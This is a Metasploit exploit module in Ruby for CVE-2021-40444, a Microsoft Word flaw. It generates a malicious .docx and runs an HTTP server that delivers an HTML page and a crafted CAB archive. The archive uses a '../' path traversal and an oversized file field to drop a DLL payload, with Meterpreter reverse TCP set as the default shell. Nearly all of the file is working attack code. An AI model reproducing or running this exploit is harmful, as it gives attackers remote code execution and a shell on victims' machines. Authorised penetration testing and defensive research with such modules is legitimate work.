##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Provided by the sunrider
# All Thanks to klezVirus & lockedbyte for the poc's
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::HttpServer::HTML

    @uri_name = ""

    def initialize(info = {})
        super(update_info(info,
            'Name'           => "Microsoft Office Word Malicious Docx Execution",
            'Description'    => %q{
                This module creates a malicious docx file that when opened in
                vulnerable versions of Microsoft Word will lead to code execution.
                This fla exists because an attacker could craft a malicious
                ActiveX control to be used by a Microsoft Office document that
                hosts the browser rendering engine.
            },
            'Author'         =>
                [
                    'thesunRider'
                ],
            'License'        => MSF_LICENSE,
            'References'     => [
                ['CVE', '2021-40444'],
                ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444'],
                ['URL', 'https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md'],
                ['URL', 'http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf'],
                ['URL', 'https://github.com/klezVirus/CVE-2021-40444']
            ],
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Microsoft Office Word', {} ]
                ],
            'DefaultTarget'  => 0,

            'Payload' =>
        {
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => false,
          'PAYLOAD' => 'windows/meterpreter/reverse_tcp',
          'EXITFUNC' => 'thread'
        },
        'Notes' => {
          'Reliability' => [ UNRELIABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'Side Effects' => [ ARTIFACTS_ON_DISK ]
        },

            'Privileged'     => false,
            'DisclosureDate' => '2021-09-23'))

        @uri_name = "#{rand_text_alphanumeric 12}"

        register_options([
            OptString.new('FILENAME', [ true, 'The file name.', 'payload.docx']),
            OptString.new('SRVHOST',  [ true, 'The Local host to serve the payload', '0.0.0.0']),
            OptString.new('SRVPORT',  [ true, 'The Local port to request data','1223']),
            OptString.new('URIPATH',  [ true, 'URI PATH Random if not assigned', "#{rand_text_alphanumeric 10}" ])
        ])
    end

    def generate_html
        template_path = ::File.join(Msf::Config.data_directory, "exploits","cve-2021-40444","srv.html")
        template_html = ::File.open(template_path, 'rb')

        data = template_html.read(template_html.stat.size)
        data.gsub!('<HOST_CHANGE_HERE>', generate_uri + ".cab")
        data.gsub!('<INF_CHANGE_HERE>', @uri_name + ".inf")
        data.gsub!('<URI_SCHEME_HERE>', ".cpl")

        template_html.close
        data
    end

    def generate_uri

        host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
        scheme = datastore['SSL'] ? 'https' : 'http'

        uri = "#{scheme}://#{host}:#{datastore['SRVPORT']}#{'/' + Rex::FileUtils.normalize_unix_path(datastore['URIPATH'])}"
        uri << "/" + @uri_name
        uri
    end

    #convert endian and fill extra bytes
    def fillbyte_count(hex,count)
        hex = hex.to_s(16)
        if hex.length%2 != 0
                hex << "0"
        end
        hex = [hex.hex].pack('V*').unpack("H*")[0][0..count-1]

        if hex.length < count
            hex << "0"*(count-hex.length)
        end
        hex
    end

    #create cab file
    def create_cabfile(input_data)
        hex_data = input_data.unpack("H*")[0]

        if hex_data.length%2 != 0
                hex_data << "0"
        end

        szName = ("../" +@uri_name +".inf").unpack("H*")[0]
        cCFData = "0200" #change 1 to 2 for the exploit to work
        cbFile = fillbyte_count(hex_data.length * 2,8) #should be greater than the file to trigger overflow
        cbData = fillbyte_count(hex_data.length/2,4) #size of data

        header_data_length = 0x39
        cbCabinet =  fillbyte_count(header_data_length + 0x8 + hex_data.length/2 +  szName.length/2 + cbFile.length/2,8)
        coffCabStart = fillbyte_count(header_data_length + cbCabinet.length/2 + szName.length/2 + cbFile.length/2 -0x4,8)

        #set current date and time in the format of cab file
        tm = Time.new
        date = fillbyte_count(((tm.year - 1980) << 9) + (tm.month << 5 ) + tm.day,4)
        time = fillbyte_count((tm.hour << 11 ) + (tm.min << 5) + (tm.sec/2),4)


        ministream_data = ""

        #header section
        ministream_data << "4d53434600000000"+cbCabinet+"00000000"
        ministream_data << "2c000000000000000301010001000000"
        ministream_data << "b80b0000"+coffCabStart+cCFData+"0000"
        ministream_data << cbFile+ "000000000000"+date+time+"7000"+szName+"00"


        #maindata
        ministream_data << "00000000"+cbData*2+ hex_data #coffCabStart point here
        ministream_data
    end


    def create_docx_format

        document_path = ::File.join(Msf::Config.data_directory, "exploits","cve-2021-40444","word_template")
        template_path = ::File.join(Msf::Config.data_directory, "exploits","cve-2021-40444","word_template","word","_rels","document.xml.rels")
        template_docx = ::File.open(template_path, 'rb')

        data = template_docx.read(template_docx.stat.size)
        data.gsub!('<EXPLOIT_HOST>', generate_uri +  ".html")
        template_docx.close


        zip_ary = []
        fs =  (Dir.glob(document_path +"/**/**", File::FNM_DOTMATCH) - %w[. ..] ).delete_if { |x| x.end_with? "."}


        fs.each do |c|
                fname = c[document_path.length+1..-1]

                if c.to_s.end_with? 'document.xml.rels'
                    fdata = data

                elsif File.file?(c)
                        document_content = ::File.open(c, 'rb')
                        fdata = document_content.read(document_content.stat.size)
                        document_content.close
                else
                        fname << "/"
                        fdata = ""
                end
                zip_ary.append({:data => fdata,:fname => fname})
        end

        Msf::Util::EXE.to_zip(zip_ary)

    end


    def on_request_uri(cli, request)
        cab_header = {'Access-Control-Allow-Origin' => "*",
                'Access-Control-Allow-Methods' => 'GET, POST, OPTIONS',
                'Cache-Control' => 'no-store, no-cache, must-revalidate',
                'Content-Type' => 'application/octet-stream',
                'Content-Disposition' =>"attachment; filename='#{@uri_name}'.cab"}

        html_header = {'Access-Control-Allow-Origin' => "*",
                'Access-Control-Allow-Methods' => 'GET, POST',
                'Cache-Control' => 'no-store, no-cache, must-revalidate',
                'Content-Type' => 'text/html; charset=UTF-8'}

        if request.method.eql? "HEAD"
            if request.raw_uri.to_s.end_with? '.cab'
                send_response(cli, "", cab_header)
            else
                send_response(cli, "", html_header)
            end

        elsif request.method.eql? "OPTIONS"

            response = create_response(501, 'Unsupported Method')
            response['Content-Type'] = 'text/html'
            response.body = ""

            cli.send_response(response)

        elsif request.raw_uri.to_s.end_with? '.html'
            print_good("Word file opened")
            print_status("Sending HTML PAYLOAD")
            send_response_html(cli, generate_html, html_header)

        elsif request.raw_uri.to_s.end_with? '.cab'
            print_status("Sending CAB PAYLOAD")
                p = regenerate_payload(cli)
                data = Msf::Util::EXE.to_win32pe_dll(
                    framework,
                    p.encoded,
                    { :arch => ARCH_X86, :platform => 'win' }
                )

            send_response(cli, [create_cabfile(data)].pack('H*'), cab_header)
        end

    end

    def exploit
        file_create(create_docx_format)
        super
    end
end
